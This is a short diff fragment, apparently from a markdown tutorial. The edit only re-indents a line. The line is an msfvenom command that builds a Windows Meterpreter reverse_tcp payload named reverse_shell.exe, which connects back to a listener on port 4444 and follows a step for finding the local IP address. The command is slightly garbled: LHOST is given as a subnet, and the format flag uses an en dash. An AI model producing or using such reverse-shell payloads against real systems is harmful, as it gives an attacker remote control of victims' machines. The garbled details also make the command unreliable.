@@ -11,7 +11,7 @@ For that, run  “ip addr”  or  “ifconfig”
  
 In the terminal run the follow command:
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.0/24 LPORT=4444 –f exe > reverse_shell.exe
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.0/24 LPORT=4444 –f exe > reverse_shell.exe
 ![image](https://github.com/user-attachments/assets/1e650a7e-9308-48b6-be77-7e482e8eadc0)
 
  
